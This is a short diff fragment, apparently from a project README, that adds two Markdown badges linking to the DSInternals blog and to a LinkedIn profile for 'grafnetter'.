+[![Blog](https://img.shields.io/badge/Blog-www.dsinternals.com-2A6496.svg)](https://www.dsinternals.com/en)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-grafnetter-0077B5.svg)](https://www.linkedin.com/in/grafnetter)
